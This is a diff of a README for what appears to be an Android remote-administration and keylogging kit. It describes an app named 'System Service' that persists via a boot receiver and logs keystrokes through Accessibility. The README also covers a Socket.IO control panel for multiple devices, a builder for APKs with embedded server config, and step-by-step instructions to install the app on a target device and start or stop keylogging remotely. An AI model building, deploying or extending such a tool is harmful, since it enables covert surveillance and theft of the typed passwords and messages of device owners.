@@ -5,7 +5,7 @@ This project is a proof-of-concept Android application that demonstrates advance
 ## Features
 - **Web Control Panel**: A responsive UI to monitor and control multiple Android devices via Socket.IO.
 - **Android System Service**: Runs as a foreground service with boot receiver and keylogger (accessibility-based).
-- **Dockerized Deployment**: Easy setup with containerized backend (portal for control, builder for APK generation).
+- **Dockerized Deployment**: Easy setup with containerized backend (nginx for frontend, server for Socket.IO + APK generation).
 - **In-Memory Device Management**: Real-time device tracking via Socket.IO events (no external DB).
 - **Dynamic APK Building**: Generate customized APKs with user-specified config URL for server connectivity.
 - **Remote Config Management**: Apps fetch configuration from a remote JSON file, enabling dynamic server updates without reinstalling APK.
@@ -36,15 +36,15 @@ The application now uses a **remote configuration model**:
 
 ## Socket.IO Architecture
 
-The server uses **namespaces** to separate traffic between Android devices and the web portal:
+The server uses **namespaces** to separate traffic between Android devices and the web frontend:
 
 | Namespace | Path | Purpose |
 |-----------|------|---------|
 | `/android` | `http://server:4000/android` | Android device connections |
-| `/portal` | `http://server:4000/portal` | Web portal connections |
+| `/frontend` | `http://server:4000/frontend` | Web frontend connections |
 
 - Android apps automatically connect to the `/android` namespace (configured as a constant in `ConfigManager.SOCKET_NAMESPACE`)
-- The web portal connects to the `/portal` namespace
+- The web frontend connects to the `/frontend` namespace
 - This separation ensures clean isolation between device traffic and control panel traffic
 
 ## Prerequisites
@@ -69,7 +69,7 @@ Create a `settings.json` file with your server details and host it (GitHub, web 
 **Example URL**: `https://raw.githubusercontent.com/user/repo/main/settings.json`
 
 ### 2. Docker Setup
-This project uses Docker for the portal (web server + Socket.IO) and builder (Android APK generation). Dockerfiles are provided: `portal/Dockerfile` and `builder/Dockerfile`. A `docker-compose.yml` file is included in the root directory for easy deployment.
+This project uses Docker for the frontend (nginx + static files) and server (Socket.IO + Android APK generation). A `docker-compose.yml` file is included in the root directory for easy deployment.
 
 1. Clone the repository
 
@@ -78,8 +78,8 @@ This project uses Docker for the portal (web server + Socket.IO) and builder (An
    docker compose up --build
    ```
 
-- Portal runs the web UI on http://localhost:4001.
-- Builder listens on http://localhost:8080 for build requests (internal from portal).
+- Server runs Socket.IO on http://localhost:4000
+- Nginx serves the frontend on http://localhost:4001
 
 ### 3. Access the Control Panel
 1. Open http://localhost:4001 in your browser.
@@ -87,8 +87,8 @@ This project uses Docker for the portal (web server + Socket.IO) and builder (An
 
 ### 4. Generate and Deploy APK
 1. In the UI, enter your **Config URL** (e.g., `https://raw.githubusercontent.com/user/repo/main/settings.json`)
-2. Click "Build APK" – this triggers the builder service to compile a customized APK with the embedded config URL.
-3. Download the generated APK from the UI link (output in `./builder/project/app/build/outputs/apk/`).
+2. Click "Build APK" – this triggers the server to compile a customized APK with the embedded config URL.
+3. Download the generated APK from the UI link (output in `./server/android-project/app/build/outputs/apk/`).
 4. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-debug.apk`).
 5. Grant Accessibility permissions to the "System Service" app for keylogging.
 6. The app will:
@@ -101,13 +101,13 @@ This project uses Docker for the portal (web server + Socket.IO) and builder (An
 Send a POST request to trigger all connected apps to revalidate their configuration:
 
 ```bash
-curl -X POST http://localhost:4001/api/validate-config
+curl -X POST http://localhost:4000/api/validate-config
 ```
 
 This is useful when you update your `settings.json` and want apps to pick up changes immediately.
 
 ### 6. Testing and Monitoring
-- Android devices connect to the configured IP:port; monitor Docker logs: `docker logs portal` or `docker compose logs`.
+- Android devices connect to the configured IP:port; monitor Docker logs: `docker compose logs` or `docker logs android-server`.
 - Use the UI to send "logger" commands (start/stop keylogging).
 - Device info (IP, model, etc.) updates in real-time via Socket.IO events.
 
@@ -119,8 +119,9 @@ This is useful when you update your `settings.json` and want apps to pick up cha
 4. Apps automatically disconnect from old server and connect to new one
 
 ## Development
-- **Portal (Node.js)**: Edit in `./portal/`. Rebuild Docker image after changes: `docker compose build portal`.
-- **Android App**: Source in `./builder/project/app/`. For manual build: `cd builder/project && ./gradlew assembleDebug -PconfigUrl='https://example.com/settings.json'`.
+- **Server (Node.js)**: Edit in `./server/`. The server also handles Android APK builds in `./server/android-project/`. Rebuild Docker image after changes: `docker compose build android-server`.
+- **Frontend**: Static files in `./nginx/public/`. No rebuild needed (mounted via volume).
+- **Android App**: Source in `./server/android-project/app/`. For manual build: `cd server/android-project && ./gradlew assembleDebug -PconfigUrl='https://example.com/settings.json'`.
 
 ## Security Notes
 - The app requests sensitive permissions (Accessibility, Boot Complete, Internet) – disclose to users.
